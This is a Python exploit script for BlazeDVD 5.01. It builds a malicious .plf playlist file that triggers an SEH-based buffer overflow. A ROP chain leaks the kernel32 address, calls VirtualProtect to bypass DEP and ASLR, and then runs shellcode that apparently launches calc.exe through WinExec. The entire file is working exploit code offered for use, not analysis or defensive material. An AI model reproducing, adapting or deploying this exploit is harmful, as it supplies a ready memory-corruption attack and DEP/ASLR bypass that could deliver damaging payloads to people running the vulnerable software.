#!/usr/bin/env python
# BlazeDVD 5.01 DEP/ASLR Exploit by iphelix
# PUSHAD chain generated by mona.py
import struct

junk1 = "A"*304

# Get kernel32 address from the stack
rop = struct.pack('L',0x61618563) # XCHG EAX,EBP # RETN
rop+= struct.pack('L',0x616301d7) # POP ECX # RETN
rop+= struct.pack('L',0xfffff0d0) # Offset
rop+= struct.pack('L',0x6162938a) # SUB EAX,ECX # RETN
rop+= struct.pack('L',0x6163227d) # MOV EAX,DWORD PTR DS:[EAX] # RETN

# Calculate VirtualProtect relative to the leaked kernel32 address
rop+= struct.pack('L',0x61628185) # POP EBP # RETN
rop+= struct.pack('L',0xfffee6fc) # Offset
rop+= struct.pack('L',0x6161a228) # ADD EAX,EBP # RETN

###########################################################
# Setup VirtualProtect

# EDI = ROP NOP (RETN)
rop+= struct.pack('L',0x6403650e) # POP EDI # RETN
rop+= struct.pack('L',0x61646807) # RETN (ROP NOP)

# ESI = ptr to VirtualProtect()
rop+= struct.pack('L',0x61642aac) # PUSH EAX # POP ESI # RETN 04

 # EBP = ReturnTo (ptr to jmp esp)
rop+= struct.pack('L',0x6410ba9b) # POP EBP # RETN
rop+= struct.pack('L',0x41414141) # junk
rop+= struct.pack('L',0x61608b81) # Pointer to PUSH ESP # RETN 04

# ESP = lPAddress (automatic)
# Autofilled

# EBX = dwSize
rop+= struct.pack('L',0x6403bed6) # POP EAX # RETN
rop+= struct.pack('L',0xfffffdff) # 512 Bytes
rop+= struct.pack('L',0x640377e0) # NEG EAX # RETN
rop+= struct.pack('L',0x6163dd7f) # PUSH EAX # ADD AL,5E # POP EBX # RETN

# EDX = NewProtect (0x40)
rop+= struct.pack('L',0x64114086) # POP EAX # RETN *
rop+= struct.pack('L',0xffffffc0) # 0x40 PAGE_EXECUTE_READWRITE *
rop+= struct.pack('L',0x6002d513) # NEG EAX # RETN *
rop+= struct.pack('L',0x640148ce) # XCHG EAX,EDX # RETN 02 *

# ECX = lpOldProtect (ptr to W address)
rop+= struct.pack('L',0x6002e5c3) # POP ECX # RETN [Configuration.dll] *
rop+= struct.pack('H',0x4141)     # junk *
rop+= struct.pack('L',0x6404f7eb) # Pointer to writable location *

# EAX = NOP (0x90909090)
rop+= struct.pack('L',0x6162f773) # POP EAX # RETN *
rop+= struct.pack('L',0x90909090) # Nop padding

# PUSH parameters from registers on the stack
rop+= struct.pack('L',0x60010324) # PUSHAD # RETN

# shellcode
sc = "\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7\xCC"

junk2 = "C"*(612 - len(sc) - len(rop) - len(junk1))
print len(junk2)

seh = struct.pack('L',0x600148df) # ADD ESP,400 # RETN

payload = junk1 + rop + sc + junk2 + seh

f = open('exploit.plf','w')
f.write(payload)
f.close()
